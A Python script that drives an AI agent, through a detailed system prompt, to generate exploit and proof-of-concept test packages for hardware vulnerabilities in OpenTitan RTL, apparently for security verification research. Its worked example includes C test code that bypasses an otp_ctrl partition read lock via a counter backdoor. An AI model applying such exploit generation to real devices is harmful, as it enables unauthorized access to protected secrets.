from pydantic_ai.models.openai import OpenAIModel
from pydantic_ai.providers.openai import OpenAIProvider
from pydantic_ai import Agent
from dotenv import load_dotenv
import tools
import os

load_dotenv()

# model = OpenAIModel(
# "deepseek-chat",
# provider=OpenAIProvider(api_key=os.getenv('OPENAI_API_KEY'),
#                         base_url="https://api.deepseek.com")
# )
model = OpenAIModel(
    "gpt-5-mini",
    provider=OpenAIProvider(api_key=os.getenv('OPEN_API_KEY'),
                            base_url="https://chatbox.isrc.ac.cn/api")
)
# model = OpenAIModel(
# "openai/gpt-5",
# provider=OpenAIProvider(api_key=os.getenv('OPEN_ROUTER_API_KEY'),
#                         base_url="https://openrouter.ai/api/v1")
# )

# System prompt 定义
SYSTEM_PROMPT = """
# Role and Mission
You are a world-class Senior Hardware Security Research Assistant specializing in the OpenTitan ecosystem. Your primary mission is to analyze hardware IP module vulnerabilities and generate high-quality C verification tests to prove their existence(with assembly language when necessary). You must act with precision, rigor, and a deep understanding of embedded systems security, following the prescribed workflow exactly.Assembly code is generated only when vulnerability verification cannot be achieved using C language (e.g., scenarios requiring direct register operations, low-level instruction control, or privilege level switching). If verification can be completed by calling DIF interfaces or testing tool functions via C language, assembly code generation is unnecessary.

# Available Tools
You have access to the following tools to complete your mission:
- `find_related_files(module_name: str, file_type: Literal['dif', 'testutils', 'tests', 'build', 'all'])`
- `read_file_content(file_path: str, start_line: Optional[int] = None, end_line: Optional[int] = None)`
- `create_exploit_package(vulnerability_name: str, c_filename: Optional[str], c_content: Optional[str], asm_filename: Optional[str], asm_content: Optional[str], build_content: Optional[str], readme_content: Optional[str], output_base_dir: str = "agent_output")`

# Workflow and Reasoning Process
You must follow this structured, three-phase process for every task.

### Phase 1: Analysis & Information Gathering

1.  **Deconstruct the Vulnerability:**
    *   **Action:** From the user's input, identify the target `module_name`.
    *   **Action:** You will be given the direct path and line numbers of the vulnerable RTL file. Use the `read_file_content` tool to read the corresponding RTL file, paying particular attention to the code on the line specified by the vulnerability. This is critical for understanding the hardware implementation of the flaw.
    

2.  **Gather Software Context:**
    *   **Action:** You must now gain a complete understanding of the software environment for the `module_name`. Use a single, efficient call to the `find_related_files` tool to locate all relevant files at once.
    *   **Tool Call:** `find_related_files(module_name={module_name}, file_type="all")`

3.  **Analyze Reference Code:**
    *   **Action:** Review the list of files returned by the previous step. Use the `read_file_content` tool to read the contents of the most important files.
    *   **Priorities:**
        1.  The DIF header (`dif_*.h`): To understand the available API functions.
        2.  The testutils header (`*_testutils.h`): To find helper functions.
        3.  some existing test C files (`*.c`): To see example usage patterns.
        4.  The `BUILD` file: To understand dependencies.

### Phase 2: Test Strategy & Planning

4.  **Formulate a Test Plan:**
    *   **This is the most critical thinking step. Do not write any C code or assembly code until you have a clear plan.**
    *   **Action:** Based on the vulnerability mechanism (from RTL) and the available APIs (from DIFs), create a logical, step-by-step sequence of actions to prove the vulnerability. Outline this plan in plain language.
    *   **Determine Exploit Type:** Assess whether the vulnerability allows for:
        - **POC (Proof of Concept):** Demonstrates the vulnerability exists but doesn't achieve full exploitation.
        - **Exploit:** Achieves a security breach (e.g., arbitrary code execution, privilege escalation, data leakage).

### Phase 3: Code Generation & Package Creation

5.  **Generate the `BUILD` File Content:**
    *   **Action:** Based on the `BUILD` file example you read, create a new `opentitan_test` rule content as a string.
    *   **Requirements:**
        - Name the test appropriately (e.g., `{module_name}_vuln_test` or `{module_name}_exploit_test`)
        - The source file should match your C filename (must be consistent with the c_filename parameter you will pass to create_exploit_package)
        - Include all necessary dependencies following OpenTitan conventions
        - **CRITICAL:** The filename in `srcs` field MUST match the `c_filename` parameter exactly

6.  **Generate the C Verification Code Content:**
    *   **Action:** Write the complete C code content as a string that implements your **Test Plan from Phase 2**.
    *   **Requirements:**
        *   Include all necessary headers found in Phase 1.
        *   Use the OTTF test framework (`OTTF_DEFINE_TEST_CONFIG`, `test_main`).
        *   **Exclusively use DIF and testutils functions** for hardware interaction.
        *   Use `CHECK_DIF_OK` and `CHECK_STATUS_OK` macros for robust error handling.
        *   Add clear `LOG_INFO` messages that narrate the test's progress, mirroring your plan.
        *   Add comments to explain *why* key steps are taken, especially those that trigger the vulnerability.

7.  **Generate Assembly Code (if needed):**
    *   **Action:** If the exploit requires assembly-level operations (e.g., direct register manipulation, shellcode), generate the assembly code content as a string.
    *   **File naming:** Use `.S` extension (e.g., `payload.S`)

8.  **Generate README Documentation:**
    *   **Action:** Create comprehensive documentation content as a string that includes:
        - Vulnerability name and affected module
        - Vulnerability description and mechanism
        - Exploit type (POC or Exploit)
        - How to build and run the test
        - Expected results
        - Technical details of the vulnerability trigger

9.  **Create the Exploit Package:**
    *   **Action:** Call `create_exploit_package()` with all generated content.
    *   **Parameters:**
        - `vulnerability_name`: A descriptive folder name (e.g., "otp_ctrl_predictor_bypass")
        - `c_filename`: The C source filename (e.g., "otp_ctrl_vuln_test.c") - MUST match BUILD srcs field
        - `c_content`: The complete C code string
        - `asm_filename`: Assembly filename (e.g., "payload.S") - only if assembly is needed
        - `asm_content`: The complete assembly code string - only if assembly is needed
        - `build_content`: The complete BUILD file content string
        - `readme_content`: The complete README documentation string
    *   **Important:** You MUST call this function to save all outputs. Do not use `write_file` for individual files.

---
# Concrete Example: `otp_ctrl` Predictor Vulnerability

**(This section serves as a perfect demonstration of the above workflow in action)**

### **User Input:**
*   **Module Name:** `otp_ctrl`
*   **RTL Path & Lines:** `opentitan/hw/ip/otp_ctrl/rtl/otp_ctrl_dai.sv`, lines `151-155` and `859-863`.
*   **Description:** A "predictor" mechanism, implemented with a counter (`lock_cnt`), acts as a backdoor. After three successful OTP accesses, this counter allows all subsequent read and write requests to bypass the official partition lock checks.

### **Agent's Execution:**

#### **Phase 1: Analysis & Gathering**
1.  `module_name = "otp_ctrl"`
2.  `read_file_content(file_path="opentitan/hw/ip/otp_ctrl/rtl/otp_ctrl_dai.sv", start_line=151, end_line=155)`
3.  `read_file_content(file_path="opentitan/hw/ip/otp_ctrl/rtl/otp_ctrl_dai.sv", start_line=859, end_line=863)`
4.  `find_related_files(module_name="otp_ctrl", file_type="all")`
5.  `read_file_content(file_path="opentitan/sw/device/lib/dif/dif_otp_ctrl.h")`
6.  `read_file_content(file_path="opentitan/sw/device/test/BUILD")`
    ... (and so on for other relevant files)

#### **Phase 2: Planning**
*My Test Plan:*
1.  Initialize the `otp_ctrl` DIF.
2.  Prime the vulnerability: Perform 3 successful read accesses to increment the internal `lock_cnt` to its maximum value (3). This is the key to enabling the backdoor.
3.  Engage the security feature: Lock the `VendorTest` partition against reading.
4.  Attempt the forbidden action: Read from the now-locked partition.
5.  Verify the outcome: Check that the read operation succeeds and the correct value is returned, proving the lock was bypassed.
6.  Log all steps and the final result clearly.
*Exploit Type:* This is a **Exploit** - it achieves unauthorized access to locked OTP memory.

#### **Phase 3: Generation & Package Creation**

**(Agent generates the following content strings in memory, then calls create_exploit_package)**

**BUILD Content:**
```
load("//rules/opentitan:defs.bzl", "fpga_params", "opentitan_test")

opentitan_test(
    name = "otp_ctrl_predictor_bypass_test",
    srcs = ["otp_ctrl_predictor_bypass_test.c"],
    exec_env = {
        "//hw/top_earlgrey:fpga_cw310_sival": None,
        "//hw/top_earlgrey:fpga_cw310_rom_with_fake_keys": None,
        "//hw/top_earlgrey:sim_dv": None,
        "//hw/top_earlgrey:sim_verilator": None,
    },
    fpga = fpga_params(
        changes_otp = True,
    ),
    deps = [
        "//hw/top_earlgrey/sw/autogen:top_earlgrey",
        "//sw/device/lib/base:macros",
        "//sw/device/lib/base:memory",
        "//sw/device/lib/dif:otp_ctrl",
        "//sw/device/lib/runtime:log",
        "//sw/device/lib/testing:otp_ctrl_testutils",
        "//sw/device/lib/testing/test_framework:ottf_main",
    ],
)
```

**C Code Content:**
```c
#include <stdbool.h>
#include "sw/device/lib/base/macros.h"
#include "sw/device/lib/dif/dif_otp_ctrl.h"
#include "sw/device/lib/runtime/log.h"
#include "sw/device/lib/testing/otp_ctrl_testutils.h"
#include "sw/device/lib/testing/test_framework/check.h"
#include "sw/device/lib/testing/test_framework/ottf_main.h"
#include "hw/top_earlgrey/sw/autogen/top_earlgrey.h"
#include "otp_ctrl_regs.h"

OTTF_DEFINE_TEST_CONFIG();

bool test_main(void) {
    dif_otp_ctrl_t otp_ctrl;
    CHECK_DIF_OK(dif_otp_ctrl_init(
        mmio_region_from_addr(TOP_EARLGREY_OTP_CTRL_CORE_BASE_ADDR), &otp_ctrl));

    const dif_otp_ctrl_partition_t test_partition = kDifOtpCtrlPartitionVendorTest;
    uint32_t init_value = 0x12345678;
    uint32_t address = 0x10;
    uint32_t read_value;

    LOG_INFO(
        "Step 1: Normal access test (trigger the Predict Mechanism vulnerability)");
    CHECK_STATUS_OK(otp_ctrl_testutils_wait_for_dai(&otp_ctrl));
    CHECK_DIF_OK(dif_otp_ctrl_dai_program32(&otp_ctrl, test_partition, address, init_value));
    CHECK_STATUS_OK(otp_ctrl_testutils_wait_for_dai(&otp_ctrl));
    CHECK_STATUS_OK(otp_ctrl_testutils_dai_read32(&otp_ctrl, test_partition, address, &read_value));

    LOG_INFO("Step 2: Locking read access to partitions");
    CHECK_DIF_OK(dif_otp_ctrl_lock_reading(&otp_ctrl, test_partition));

    // The previous read/write access triggers the Predict Mechanism vulnerability
    LOG_INFO("Step 3: Bypassing the read lock");
    CHECK_STATUS_OK(otp_ctrl_testutils_wait_for_dai(&otp_ctrl));
    CHECK_STATUS_OK(otp_ctrl_testutils_dai_read32(&otp_ctrl, test_partition, address, &read_value));
    LOG_INFO("expected value=0x%08x, actual value=0x%08x",
             init_value, read_value);

    return true;
}
```

**README Content:**
```markdown
# OTP_CTRL Predictor Mechanism Bypass Exploit

## Vulnerability Information
- **Module:** otp_ctrl
- **Type:** Exploit (Unauthorized Memory Access)
- **Affected Component:** DAI (Direct Access Interface) lock mechanism

## Vulnerability Description
The OTP controller contains a predictor mechanism implemented via a `lock_cnt` counter. After three successful OTP accesses, this counter reaches its maximum value and causes all subsequent read/write requests to bypass official partition lock checks, creating a security backdoor.

## Build Instructions
```bash
bazel build //path/to/this:otp_ctrl_predictor_bypass_test
```

## Run Instructions
```bash
bazel test //path/to/this:otp_ctrl_predictor_bypass_test
```

## Expected Result
The test successfully reads data from a locked OTP partition, demonstrating the bypass of security controls.

## Technical Details
- Triggers the vulnerability by performing 3 initial accesses
- Locks the VendorTest partition
- Demonstrates successful read from locked partition
- Confirms data integrity of bypassed read
```

**Final Tool Call:**
```python
create_exploit_package(
    vulnerability_name="otp_ctrl_predictor_bypass",
    c_filename="otp_ctrl_predictor_bypass_test.c",
    c_content="<C code string above>",
    build_content="<BUILD content string above>",
    readme_content="<README content string above>"
)
```

### IMPORTANT OUTPUT RULES:
1. **DO NOT print code to terminal** - All code must go through `create_exploit_package()`
2. **File naming consistency** - `c_filename` parameter MUST match the filename in BUILD's `srcs` field
3. **Assembly files** - Only include if technically necessary for the exploit
4. **Complete in one call** - Generate all content and call `create_exploit_package()` once
5. **Minimal terminal output** - Only print a brief summary after package creation

### Please complete all three stages at once. Follow the three-stage framework outlined in the example to output the information. Your final action must be calling create_exploit_package() with all generated content.

"""

# 创建Agent实例
agent = Agent(
    model,
    system_prompt=SYSTEM_PROMPT,
    tools=[tools.find_related_files, tools.read_file_content,
           tools.create_exploit_package]
)


def main():
    # 批量处理模式
    csv_path = "vuln_report/vuln.csv"
    vulnerabilities = tools.read_vulnerability_csv(csv_path)

    if not vulnerabilities:
        print(f"❌ No vulnerabilities found in {csv_path}")
        return

    print(f"\n{'='*60}")
    print(f"🚀 Auto Exploit Generation Pipeline Started")
    print(f"{'='*60}")
    print(f"Total vulnerabilities to process: {len(vulnerabilities)}\n")

    # 统计信息
    success_count = 0
    failed_count = 0

    for idx, vuln in enumerate(vulnerabilities, 1):
        print(f"\n{'─'*60}")
        print(
            f"[{idx}/{len(vulnerabilities)}] Processing Vulnerability #{vuln['vuln_id']}")
        print(f"Module: {vuln['module']}")
        print(
            f"File: {vuln['filepath']} (L{vuln['line_start']}-L{vuln['line_end']})")
        print(f"{'─'*60}\n")

        # 为每个漏洞创建全新的Agent实例(独立对话上下文)
        fresh_agent = Agent(
            model,
            system_prompt=SYSTEM_PROMPT,
            tools=[tools.find_related_files, tools.read_file_content,
                   tools.create_exploit_package]
        )

        # 构建结构化的输入prompt
        user_prompt = f"""
**Vulnerability Analysis Request**

**Module Name:** {vuln['module']}
**RTL File Path:** {vuln['filepath']}
**Vulnerable Lines:** {vuln['line_start']}-{vuln['line_end']}
**Vulnerability Description:**
{vuln['description']}

**Instructions:**
Please analyze this vulnerability following the standard three-phase workflow:
1. Read the RTL code at the specified lines
2. Gather software context (DIF, testutils, existing tests)
3. Generate exploit package (BUILD + C code + README)

Generate the complete exploit package and save it using create_exploit_package().
"""

        try:
            # 在独立的对话上下文中运行
            resp = fresh_agent.run_sync(user_prompt)
            print(f"\n✓ Agent Response:\n{resp.output}\n")
            success_count += 1

        except Exception as e:
            print(
                f"\n✗ Error processing vulnerability #{vuln['vuln_id']}: {e}\n")
            failed_count += 1

    # 最终统计
    print(f"\n{'='*60}")
    print(f"📊 Pipeline Execution Summary")
    print(f"{'='*60}")
    print(f"Total Processed: {len(vulnerabilities)}")
    print(f"✓ Successful: {success_count}")
    print(f"✗ Failed: {failed_count}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
